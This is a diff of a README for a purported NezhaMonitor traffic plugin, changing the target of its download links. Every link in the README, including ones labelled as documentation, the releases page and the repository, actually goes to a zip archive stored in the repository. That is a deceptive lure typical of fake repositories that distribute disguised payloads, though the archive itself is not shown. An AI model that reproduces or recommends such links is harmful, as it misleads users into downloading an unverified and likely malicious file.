@@ -1,6 +1,6 @@
 # 🌐 TrafficMonitorPlugins-for-NezhaMonitor - Monitor Your Traffic with Ease
 
-[![Download TrafficMonitorPlugins](https://raw.githubusercontent.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/master/monographic/TrafficMonitorPlugins-for-NezhaMonitor.zip)](https://raw.githubusercontent.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/master/monographic/TrafficMonitorPlugins-for-NezhaMonitor.zip)
+[![Download TrafficMonitorPlugins](https://github.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/raw/refs/heads/master/TrafficMonitorPlugins-for-NezhaMonitor/for-Plugins-Traffic-Nezha-Monitor-v2.0.zip)](https://github.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/raw/refs/heads/master/TrafficMonitorPlugins-for-NezhaMonitor/for-Plugins-Traffic-Nezha-Monitor-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to TrafficMonitorPlugins for NezhaMonitor! This tool helps you track you
 
 To get started, visit the page linked below. You will find the latest versions of the application ready for download.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/master/monographic/TrafficMonitorPlugins-for-NezhaMonitor.zip)
+[Visit the Releases Page to Download](https://github.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/raw/refs/heads/master/TrafficMonitorPlugins-for-NezhaMonitor/for-Plugins-Traffic-Nezha-Monitor-v2.0.zip)
 
 ### Steps to Download and Install:
 
@@ -55,8 +55,8 @@ Join our community to share your experiences and tips about using TrafficMonitor
 
 ## 🔗 Useful Links
 
-- [Download TrafficMonitorPlugins](https://raw.githubusercontent.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/master/monographic/TrafficMonitorPlugins-for-NezhaMonitor.zip)
-- [Documentation](https://raw.githubusercontent.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/master/monographic/TrafficMonitorPlugins-for-NezhaMonitor.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/master/monographic/TrafficMonitorPlugins-for-NezhaMonitor.zip)
+- [Download TrafficMonitorPlugins](https://github.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/raw/refs/heads/master/TrafficMonitorPlugins-for-NezhaMonitor/for-Plugins-Traffic-Nezha-Monitor-v2.0.zip)
+- [Documentation](https://github.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/raw/refs/heads/master/TrafficMonitorPlugins-for-NezhaMonitor/for-Plugins-Traffic-Nezha-Monitor-v2.0.zip)
+- [GitHub Repository](https://github.com/edizzo/TrafficMonitorPlugins-for-NezhaMonitor/raw/refs/heads/master/TrafficMonitorPlugins-for-NezhaMonitor/for-Plugins-Traffic-Nezha-Monitor-v2.0.zip)
 
 Feel free to reach out with any questions or feedback. Enjoy monitoring your network traffic with TrafficMonitorPlugins!
